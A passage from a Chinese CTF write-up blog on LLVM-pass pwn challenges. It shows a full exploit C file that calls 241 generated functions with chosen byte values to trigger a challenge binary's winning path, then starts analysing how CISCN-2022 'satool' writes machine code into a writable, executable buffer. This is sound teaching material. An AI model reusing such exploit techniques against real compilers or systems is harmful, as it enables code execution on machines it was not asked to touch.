class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br></pre></td><td class="code"><pre><span class="line">// clang-8 -emit-llvm -S exp.c -o exp.ll</span><br><span class="line">void winmt000(int x);</span><br><span class="line">void winmt001(int x);</span><br><span class="line">void winmt002(int x);</span><br><span class="line">void winmt003(int x);</span><br><span class="line">void winmt004(int x);</span><br><span class="line">void winmt005(int x);</span><br><span class="line">void winmt006(int x);</span><br><span class="line">void winmt007(int x);</span><br><span class="line">void winmt008(int x);</span><br><span class="line">void winmt009(int x);</span><br><span class="line">void winmt010(int x);</span><br><span class="line">void winmt011(int x);</span><br><span class="line">void winmt012(int x);</span><br><span class="line">void winmt013(int x);</span><br><span class="line">void winmt014(int x);</span><br><span class="line">void winmt015(int x);</span><br><span class="line">void winmt016(int x);</span><br><span class="line">void winmt017(int x);</span><br><span class="line">void winmt018(int x);</span><br><span class="line">void winmt019(int x);</span><br><span class="line">void winmt020(int x);</span><br><span class="line">void winmt021(int x);</span><br><span class="line">void winmt022(int x);</span><br><span class="line">void winmt023(int x);</span><br><span class="line">void winmt024(int x);</span><br><span class="line">void winmt025(int x);</span><br><span class="line">void winmt026(int x);</span><br><span class="line">void winmt027(int x);</span><br><span class="line">void winmt028(int x);</span><br><span class="line">void winmt029(int x);</span><br><span class="line">void winmt030(int x);</span><br><span class="line">void winmt031(int x);</span><br><span class="line">void winmt032(int x);</span><br><span class="line">void winmt033(int x);</span><br><span class="line">void winmt034(int x);</span><br><span class="line">void winmt035(int x);</span><br><span class="line">void winmt036(int x);</span><br><span class="line">void winmt037(int x);</span><br><span class="line">void winmt038(int x);</span><br><span class="line">void winmt039(int x);</span><br><span class="line">void winmt040(int x);</span><br><span class="line">void winmt041(int x);</span><br><span class="line">void winmt042(int x);</span><br><span class="line">void winmt043(int x);</span><br><span class="line">void winmt044(int x);</span><br><span class="line">void winmt045(int x);</span><br><span class="line">void winmt046(int x);</span><br><span class="line">void winmt047(int x);</span><br><span class="line">void winmt048(int x);</span><br><span class="line">void winmt049(int x);</span><br><span class="line">void winmt050(int x);</span><br><span class="line">void winmt051(int x);</span><br><span class="line">void winmt052(int x);</span><br><span class="line">void winmt053(int x);</span><br><span class="line">void winmt054(int x);</span><br><span class="line">void winmt055(int x);</span><br><span class="line">void winmt056(int x);</span><br><span class="line">void winmt057(int x);</span><br><span class="line">void winmt058(int x);</span><br><span class="line">void winmt059(int x);</span><br><span class="line">void winmt060(int x);</span><br><span class="line">void winmt061(int x);</span><br><span class="line">void winmt062(int x);</span><br><span class="line">void winmt063(int x);</span><br><span class="line">void winmt064(int x);</span><br><span class="line">void winmt065(int x);</span><br><span class="line">void winmt066(int x);</span><br><span class="line">void winmt067(int x);</span><br><span class="line">void winmt068(int x);</span><br><span class="line">void winmt069(int x);</span><br><span class="line">void winmt070(int x);</span><br><span class="line">void winmt071(int x);</span><br><span class="line">void winmt072(int x);</span><br><span class="line">void winmt073(int x);</span><br><span class="line">void winmt074(int x);</span><br><span class="line">void winmt075(int x);</span><br><span class="line">void winmt076(int x);</span><br><span class="line">void winmt077(int x);</span><br><span class="line">void winmt078(int x);</span><br><span class="line">void winmt079(int x);</span><br><span class="line">void winmt080(int x);</span><br><span class="line">void winmt081(int x);</span><br><span class="line">void winmt082(int x);</span><br><span class="line">void winmt083(int x);</span><br><span class="line">void winmt084(int x);</span><br><span class="line">void winmt085(int x);</span><br><span class="line">void winmt086(int x);</span><br><span class="line">void winmt087(int x);</span><br><span class="line">void winmt088(int x);</span><br><span class="line">void winmt089(int x);</span><br><span class="line">void winmt090(int x);</span><br><span class="line">void winmt091(int x);</span><br><span class="line">void winmt092(int x);</span><br><span class="line">void winmt093(int x);</span><br><span class="line">void winmt094(int x);</span><br><span class="line">void winmt095(int x);</span><br><span class="line">void winmt096(int x);</span><br><span class="line">void winmt097(int x);</span><br><span class="line">void winmt098(int x);</span><br><span class="line">void winmt099(int x);</span><br><span class="line">void winmt100(int x);</span><br><span class="line">void winmt101(int x);</span><br><span class="line">void winmt102(int x);</span><br><span class="line">void winmt103(int x);</span><br><span class="line">void winmt104(int x);</span><br><span class="line">void winmt105(int x);</span><br><span class="line">void winmt106(int x);</span><br><span class="line">void winmt107(int x);</span><br><span class="line">void winmt108(int x);</span><br><span class="line">void winmt109(int x);</span><br><span class="line">void winmt110(int x);</span><br><span class="line">void winmt111(int x);</span><br><span class="line">void winmt112(int x);</span><br><span class="line">void winmt113(int x);</span><br><span class="line">void winmt114(int x);</span><br><span class="line">void winmt115(int x);</span><br><span class="line">void winmt116(int x);</span><br><span class="line">void winmt117(int x);</span><br><span class="line">void winmt118(int x);</span><br><span class="line">void winmt119(int x);</span><br><span class="line">void winmt120(int x);</span><br><span class="line">void winmt121(int x);</span><br><span class="line">void winmt122(int x);</span><br><span class="line">void winmt123(int x);</span><br><span class="line">void winmt124(int x);</span><br><span class="line">void winmt125(int x);</span><br><span class="line">void winmt126(int x);</span><br><span class="line">void winmt127(int x);</span><br><span class="line">void winmt128(int x);</span><br><span class="line">void winmt129(int x);</span><br><span class="line">void winmt130(int x);</span><br><span class="line">void winmt131(int x);</span><br><span class="line">void winmt132(int x);</span><br><span class="line">void winmt133(int x);</span><br><span class="line">void winmt134(int x);</span><br><span class="line">void winmt135(int x);</span><br><span class="line">void winmt136(int x);</span><br><span class="line">void winmt137(int x);</span><br><span class="line">void winmt138(int x);</span><br><span class="line">void winmt139(int x);</span><br><span class="line">void winmt140(int x);</span><br><span class="line">void winmt141(int x);</span><br><span class="line">void winmt142(int x);</span><br><span class="line">void winmt143(int x);</span><br><span class="line">void winmt144(int x);</span><br><span class="line">void winmt145(int x);</span><br><span class="line">void winmt146(int x);</span><br><span class="line">void winmt147(int x);</span><br><span class="line">void winmt148(int x);</span><br><span class="line">void winmt149(int x);</span><br><span class="line">void winmt150(int x);</span><br><span class="line">void winmt151(int x);</span><br><span class="line">void winmt152(int x);</span><br><span class="line">void winmt153(int x);</span><br><span class="line">void winmt154(int x);</span><br><span class="line">void winmt155(int x);</span><br><span class="line">void winmt156(int x);</span><br><span class="line">void winmt157(int x);</span><br><span class="line">void winmt158(int x);</span><br><span class="line">void winmt159(int x);</span><br><span class="line">void winmt160(int x);</span><br><span class="line">void winmt161(int x);</span><br><span class="line">void winmt162(int x);</span><br><span class="line">void winmt163(int x);</span><br><span class="line">void winmt164(int x);</span><br><span class="line">void winmt165(int x);</span><br><span class="line">void winmt166(int x);</span><br><span class="line">void winmt167(int x);</span><br><span class="line">void winmt168(int x);</span><br><span class="line">void winmt169(int x);</span><br><span class="line">void winmt170(int x);</span><br><span class="line">void winmt171(int x);</span><br><span class="line">void winmt172(int x);</span><br><span class="line">void winmt173(int x);</span><br><span class="line">void winmt174(int x);</span><br><span class="line">void winmt175(int x);</span><br><span class="line">void winmt176(int x);</span><br><span class="line">void winmt177(int x);</span><br><span class="line">void winmt178(int x);</span><br><span class="line">void winmt179(int x);</span><br><span class="line">void winmt180(int x);</span><br><span class="line">void winmt181(int x);</span><br><span class="line">void winmt182(int x);</span><br><span class="line">void winmt183(int x);</span><br><span class="line">void winmt184(int x);</span><br><span class="line">void winmt185(int x);</span><br><span class="line">void winmt186(int x);</span><br><span class="line">void winmt187(int x);</span><br><span class="line">void winmt188(int x);</span><br><span class="line">void winmt189(int x);</span><br><span class="line">void winmt190(int x);</span><br><span class="line">void winmt191(int x);</span><br><span class="line">void winmt192(int x);</span><br><span class="line">void winmt193(int x);</span><br><span class="line">void winmt194(int x);</span><br><span class="line">void winmt195(int x);</span><br><span class="line">void winmt196(int x);</span><br><span class="line">void winmt197(int x);</span><br><span class="line">void winmt198(int x);</span><br><span class="line">void winmt199(int x);</span><br><span class="line">void winmt200(int x);</span><br><span class="line">void winmt201(int x);</span><br><span class="line">void winmt202(int x);</span><br><span class="line">void winmt203(int x);</span><br><span class="line">void winmt204(int x);</span><br><span class="line">void winmt205(int x);</span><br><span class="line">void winmt206(int x);</span><br><span class="line">void winmt207(int x);</span><br><span class="line">void winmt208(int x);</span><br><span class="line">void winmt209(int x);</span><br><span class="line">void winmt210(int x);</span><br><span class="line">void winmt211(int x);</span><br><span class="line">void winmt212(int x);</span><br><span class="line">void winmt213(int x);</span><br><span class="line">void winmt214(int x);</span><br><span class="line">void winmt215(int x);</span><br><span class="line">void winmt216(int x);</span><br><span class="line">void winmt217(int x);</span><br><span class="line">void winmt218(int x);</span><br><span class="line">void winmt219(int x);</span><br><span class="line">void winmt220(int x);</span><br><span class="line">void winmt221(int x);</span><br><span class="line">void winmt222(int x);</span><br><span class="line">void winmt223(int x);</span><br><span class="line">void winmt224(int x);</span><br><span class="line">void winmt225(int x);</span><br><span class="line">void winmt226(int x);</span><br><span class="line">void winmt227(int x);</span><br><span class="line">void winmt228(int x);</span><br><span class="line">void winmt229(int x);</span><br><span class="line">void winmt230(int x);</span><br><span class="line">void winmt231(int x);</span><br><span class="line">void winmt232(int x);</span><br><span class="line">void winmt233(int x);</span><br><span class="line">void winmt234(int x);</span><br><span class="line">void winmt235(int x);</span><br><span class="line">void winmt236(int x);</span><br><span class="line">void winmt237(int x);</span><br><span class="line">void winmt238(int x);</span><br><span class="line">void winmt239(int x);</span><br><span class="line">void winmt240(int x);</span><br><span class="line"> </span><br><span class="line">void fight(int x);</span><br><span class="line"> </span><br><span class="line">void gamestart()</span><br><span class="line">&#123;</span><br><span class="line">    winmt000(0);</span><br><span class="line">    winmt001(0);</span><br><span class="line">    winmt002(0);</span><br><span class="line">    winmt003(0);</span><br><span class="line">    winmt004(0);</span><br><span class="line">    winmt005(0);</span><br><span class="line">    winmt006(0);</span><br><span class="line">    winmt007(0);</span><br><span class="line">    winmt008(0);</span><br><span class="line">    winmt009(0);</span><br><span class="line">    winmt010(0);</span><br><span class="line">    winmt011(0);</span><br><span class="line">    winmt012(0);</span><br><span class="line">    winmt013(0);</span><br><span class="line">    winmt014(0);</span><br><span class="line">    winmt015(0);</span><br><span class="line">    winmt016(0);</span><br><span class="line">    winmt017(0);</span><br><span class="line">    winmt018(0);</span><br><span class="line">    winmt019(0);</span><br><span class="line">    winmt020(0);</span><br><span class="line">    winmt021(0);</span><br><span class="line">    winmt022(0);</span><br><span class="line">    winmt023(0);</span><br><span class="line">    winmt024(0);</span><br><span class="line">    winmt025(0);</span><br><span class="line">    winmt026(0);</span><br><span class="line">    winmt027(0);</span><br><span class="line">    winmt028(0);</span><br><span class="line">    winmt029(0);</span><br><span class="line">    winmt030(0);</span><br><span class="line">    winmt031(0);</span><br><span class="line">    winmt032(0);</span><br><span class="line">    winmt033(0);</span><br><span class="line">    winmt034(0);</span><br><span class="line">    winmt035(0);</span><br><span class="line">    winmt036(0);</span><br><span class="line">    winmt037(0);</span><br><span class="line">    winmt038(0);</span><br><span class="line">    winmt039(0);</span><br><span class="line">    winmt040(0);</span><br><span class="line">    winmt041(0);</span><br><span class="line">    winmt042(0);</span><br><span class="line">    winmt043(0);</span><br><span class="line">    winmt044(0);</span><br><span class="line">    winmt045(0);</span><br><span class="line">    winmt046(0);</span><br><span class="line">    winmt047(0);</span><br><span class="line">    winmt048(0);</span><br><span class="line">    winmt049(0);</span><br><span class="line">    winmt050(0);</span><br><span class="line">    winmt051(0);</span><br><span class="line">    winmt052(0);</span><br><span class="line">    winmt053(0);</span><br><span class="line">    winmt054(0);</span><br><span class="line">    winmt055(0);</span><br><span class="line">    winmt056(0);</span><br><span class="line">    winmt057(0);</span><br><span class="line">    winmt058(0);</span><br><span class="line">    winmt059(0);</span><br><span class="line">    winmt060(0);</span><br><span class="line">    winmt061(0);</span><br><span class="line">    winmt062(0);</span><br><span class="line">    winmt063(0);</span><br><span class="line">    winmt064(0);</span><br><span class="line">    winmt065(0);</span><br><span class="line">    winmt066(0);</span><br><span class="line">    winmt067(0);</span><br><span class="line">    winmt068(0);</span><br><span class="line">    winmt069(0);</span><br><span class="line">    winmt070(0);</span><br><span class="line">    winmt071(0);</span><br><span class="line">    winmt072(0);</span><br><span class="line">    winmt073(0);</span><br><span class="line">    winmt074(0);</span><br><span class="line">    winmt075(0);</span><br><span class="line">    winmt076(0);</span><br><span class="line">    winmt077(0);</span><br><span class="line">    winmt078(0);</span><br><span class="line">    winmt079(0);</span><br><span class="line">    winmt080(0);</span><br><span class="line">    winmt081(0);</span><br><span class="line">    winmt082(0);</span><br><span class="line">    winmt083(0);</span><br><span class="line">    winmt084(0);</span><br><span class="line">    winmt085(0);</span><br><span class="line">    winmt086(0);</span><br><span class="line">    winmt087(0);</span><br><span class="line">    winmt088(0);</span><br><span class="line">    winmt089(0);</span><br><span class="line">    winmt090(0);</span><br><span class="line">    winmt091(0);</span><br><span class="line">    winmt092(0);</span><br><span class="line">    winmt093(0);</span><br><span class="line">    winmt094(0);</span><br><span class="line">    winmt095(0);</span><br><span class="line">    winmt096(0);</span><br><span class="line">    winmt097(0);</span><br><span class="line">    winmt098(0);</span><br><span class="line">    winmt099(0);</span><br><span class="line">    winmt100(0);</span><br><span class="line">    winmt101(0);</span><br><span class="line">    winmt102(0);</span><br><span class="line">    winmt103(0);</span><br><span class="line">    winmt104(0);</span><br><span class="line">    winmt105(0);</span><br><span class="line">    winmt106(0);</span><br><span class="line">    winmt107(0);</span><br><span class="line">    winmt108(0);</span><br><span class="line">    winmt109(0);</span><br><span class="line">    winmt110(0);</span><br><span class="line">    winmt111(0);</span><br><span class="line">    winmt112(0);</span><br><span class="line">    winmt113(0);</span><br><span class="line">    winmt114(0);</span><br><span class="line">    winmt115(0);</span><br><span class="line">    winmt116(0);</span><br><span class="line">    winmt117(0);</span><br><span class="line">    winmt118(0);</span><br><span class="line">    winmt119(0);</span><br><span class="line">    winmt120(0);</span><br><span class="line">    winmt121(0);</span><br><span class="line">    winmt122(0);</span><br><span class="line">    winmt123(0);</span><br><span class="line">    winmt124(0);</span><br><span class="line">    winmt125(0);</span><br><span class="line">    winmt126(0);</span><br><span class="line">    winmt127(0);</span><br><span class="line">    winmt128(0);</span><br><span class="line">    winmt129(0);</span><br><span class="line">    winmt130(0);</span><br><span class="line">    winmt131(0);</span><br><span class="line">    winmt132(0);</span><br><span class="line">    winmt133(0);</span><br><span class="line">    winmt134(0);</span><br><span class="line">    winmt135(0);</span><br><span class="line">    winmt136(0);</span><br><span class="line">    winmt137(0);</span><br><span class="line">    winmt138(0);</span><br><span class="line">    winmt139(0);</span><br><span class="line">    winmt140(0);</span><br><span class="line">    winmt141(0);</span><br><span class="line">    winmt142(0);</span><br><span class="line">    winmt143(0);</span><br><span class="line">    winmt144(0);</span><br><span class="line">    winmt145(0);</span><br><span class="line">    winmt146(0);</span><br><span class="line">    winmt147(0);</span><br><span class="line">    winmt148(0);</span><br><span class="line">    winmt149(0);</span><br><span class="line">    winmt150(0);</span><br><span class="line">    winmt151(0);</span><br><span class="line">    winmt152(0);</span><br><span class="line">    winmt153(0);</span><br><span class="line">    winmt154(0);</span><br><span class="line">    winmt155(0);</span><br><span class="line">    winmt156(0);</span><br><span class="line">    winmt157(0);</span><br><span class="line">    winmt158(0);</span><br><span class="line">    winmt159(0);</span><br><span class="line">    winmt160(0);</span><br><span class="line">    winmt161(0);</span><br><span class="line">    winmt162(0);</span><br><span class="line">    winmt163(0);</span><br><span class="line">    winmt164(0);</span><br><span class="line">    winmt165(0);</span><br><span class="line">    winmt166(0);</span><br><span class="line">    winmt167(0);</span><br><span class="line">    winmt168(0);</span><br><span class="line">    winmt169(0);</span><br><span class="line">    winmt170(0);</span><br><span class="line">    winmt171(0);</span><br><span class="line">    winmt172(0);</span><br><span class="line">    winmt173(0);</span><br><span class="line">    winmt174(0);</span><br><span class="line">    winmt175(0);</span><br><span class="line">    winmt176(0);</span><br><span class="line">    winmt177(0);</span><br><span class="line">    winmt178(0);</span><br><span class="line">    winmt179(0);</span><br><span class="line">    winmt180(0);</span><br><span class="line">    winmt181(0);</span><br><span class="line">    winmt182(0);</span><br><span class="line">    winmt183(0);</span><br><span class="line">    winmt184(0);</span><br><span class="line">    winmt185(0);</span><br><span class="line">    winmt186(0);</span><br><span class="line">    winmt187(0);</span><br><span class="line">    winmt188(0);</span><br><span class="line">    winmt189(0);</span><br><span class="line">    winmt190(0);</span><br><span class="line">    winmt191(0);</span><br><span class="line">    winmt192(0);</span><br><span class="line">    winmt193(0);</span><br><span class="line">    winmt194(0);</span><br><span class="line">    winmt195(0);</span><br><span class="line">    winmt196(0);</span><br><span class="line">    winmt197(0);</span><br><span class="line">    winmt198(0);</span><br><span class="line">    winmt199(0);</span><br><span class="line">    winmt200(0);</span><br><span class="line">    winmt201(0);</span><br><span class="line">    winmt202(0);</span><br><span class="line">    winmt203(0);</span><br><span class="line">    winmt204(0);</span><br><span class="line">    winmt205(0);</span><br><span class="line">    winmt206(0);</span><br><span class="line">    winmt207(0);</span><br><span class="line">    winmt208(0);</span><br><span class="line">    winmt209(0);</span><br><span class="line">    winmt210(0);</span><br><span class="line">    winmt211(0);</span><br><span class="line">    winmt212(0);</span><br><span class="line">    winmt213(0);</span><br><span class="line">    winmt214(0);</span><br><span class="line">    winmt215(0);</span><br><span class="line">    winmt216(0);</span><br><span class="line">    winmt217(0);</span><br><span class="line">    winmt218(0);</span><br><span class="line">    winmt219(0);</span><br><span class="line">    winmt220(0);</span><br><span class="line">    winmt221(0);</span><br><span class="line">    winmt222(0);</span><br><span class="line">    winmt223(0);</span><br><span class="line">    winmt224(0);</span><br><span class="line">    winmt225(0);</span><br><span class="line">    winmt226(0);</span><br><span class="line">    winmt227(0);</span><br><span class="line">    winmt228(0);</span><br><span class="line">    winmt229(0);</span><br><span class="line">    winmt230(0);</span><br><span class="line">    winmt231(0);</span><br><span class="line">    winmt232(0x6B);</span><br><span class="line">    winmt233(0x69);</span><br><span class="line">    winmt234(0x44);</span><br><span class="line">    winmt235(0x00);</span><br><span class="line">    winmt236(0);</span><br><span class="line">    winmt237(0);</span><br><span class="line">    winmt238(0);</span><br><span class="line">    winmt239(0);</span><br><span class="line">    winmt240(0x90);</span><br><span class="line"> </span><br><span class="line">    winmt240(0x90);</span><br><span class="line">    winmt232(0x6B);</span><br><span class="line">    winmt233(0x69);</span><br><span class="line">    winmt234(0x44);</span><br><span class="line">    winmt235(0x00);</span><br><span class="line"> </span><br><span class="line">    fight(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="CISCN-2022-satool"   >
          <a href="#CISCN-2022-satool" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN-2022-satool" class="headerlink" title="CISCN-2022 satool"></a>CISCN-2022 satool</h2>
      
        <h3 id="漏洞分析-3"   >
          <a href="#漏洞分析-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>
      <p>常见的找到处理函数<code>runOnFunction</code>和注册名<code>mba</code>，函数名称没有限定，任意函数都可以。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831092827452.png" alt="image-20230831092827452"></p>
<p>首先是给<code>this[4]</code>可写可执行权限，然后进入<code>handle</code>对其进行操作</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831094134640.png" alt="image-20230831094134640"></p>

        <h4 id="handle函数"   >
          <a href="#handle函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#handle函数" class="headerlink" title="handle函数"></a>handle函数</h4>
      <p>在<code>handle</code>里面针对基本块的操作数的属性(常量/函数参数/本地变量)，来调用对应的函数对<code>this</code>进行修改</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831094203070.png" alt="image-20230831094203070"></p>
<ul>
<li><p><code>arg0</code>为常量：</p>
<p><code>this[12]</code>赋值为0</p>
<ul>
<li><p><code>writeMovImm64(this, 0, SExtValue)</code>：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831094355406.png" alt="image-20230831094355406"></p>
<p>写入<code>this[5]</code>指针对应内容为<code>\x48\xB8 + a3</code>，这个<code>a3</code>即为基本块的操作数 ，随后<code>this[5]</code>对应指针+10，相当于一次修改10个字节，对应汇编语句为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831140633173.png" alt="image-20230831140633173"></p>
</li>
<li><p><code>write(this)</code>：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831094815416.png" alt="image-20230831094815416"></p>
<p>写入<code>this[5]</code>指针对应内容为<code>\xc3</code>，对应汇编为<code>ret</code></p>
<p>总的来说就是写入<code>(\x48\xB8 + a3)</code>再写入<code>\xc3</code></p>
</li>
</ul>
</li>
<li><p><code>arg0</code>为函数参数：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831140800260.png" alt="image-20230831140800260"></p>
<p><code>this[12]</code>赋值为1，通过上述分析可知，写入<code>this[5]</code>的数据为<code>(\x48\xB8\x00).ljust(10,&#39;\x00&#39;) + \xc3</code>，对应汇编为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831140826181.png" alt="image-20230831140826181"></p>
</li>
<li><p><code>arg0</code>为本地变量：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831141053247.png" alt="image-20230831141053247"></p>
<p>首先是写入<code>movavs rax,0</code>，然后<code>this[12]</code>赋值为0，<code>stackLLvmValueVar</code>压入操作符，<code>stackIntVar</code>压入1，进入循环，直到写入<code>0xff0</code>字节后跳出循环</p>
<ul>
<li><p><code>while</code>循环</p>
<p>经过一些判断，代表只对操作符为<code>\xd</code>和<code>\xf</code>的进行操作，查<code>LLVM</code>定义的表为<code>add</code>和<code>sub</code>指令有效。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831141354185.png" alt="image-20230831141354185"></p>
<ul>
<li><p><code>arg0</code>为常量，且为1或-1时，调用<code>writeInc</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831141929747.png" alt="image-20230831141929747"><code>stackIntVar_top*arg0</code>为1时，写入<code>inc rax</code><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142327635.png" alt="image-20230831142327635"><code>stackIntVar_top*arg0</code>不为1时，写入<code>dec rax</code><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142406119.png" alt="image-20230831142406119"></p>
<p><code>arg0</code>为常量不为1或-1时，调用<code>writeMovImm64</code>函数，写入<code>\x48\xbb + arg0*stackIntVar_top </code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142605020.png" alt="image-20230831142605020"></p>
<p>调用<code>writeOpReg</code>函数，写入<code>\x48\x01\xd8</code>，即为<code>add rax,rbx</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831143318448.png" alt="image-20230831143318448"></p>
</li>
<li><p><code>arg0</code>为函数参数时，<code>this[12]</code>赋值为<code>stackIntVar_top</code></p>
